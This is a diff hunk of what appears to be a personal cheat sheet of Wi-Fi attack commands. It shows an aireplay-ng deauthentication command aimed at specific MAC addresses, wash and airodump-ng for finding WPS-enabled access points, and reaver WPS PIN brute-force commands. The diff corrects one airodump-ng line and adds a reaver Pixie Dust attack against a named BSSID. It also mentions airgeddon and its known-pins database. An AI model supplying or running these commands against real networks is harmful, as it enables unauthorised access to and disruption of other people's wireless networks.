@@ -55,9 +55,10 @@ sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
 ```
 sudo wash -i wlan0mon
 -5 for 5GHz
-airodump-ng --wps
+airodump-ng --wps wlan0mon
 sudo reaver -b 6C:5A:B0:5D:A6:A6 -i wlan0mon -v
 sudo reaver -b 6C:5A:B0:5D:A6:A6 -i wlan0mon -v -K
+sudo reaver --interface wlan0mon --bssid 6C:5A:B0:5D:A7:DC --channel 9 -vv -N -O reaver_output.pcap --pixie-dust 1
 
 sudo apt install airgeddon
 source /usr/share/airgeddon/known_pins.db
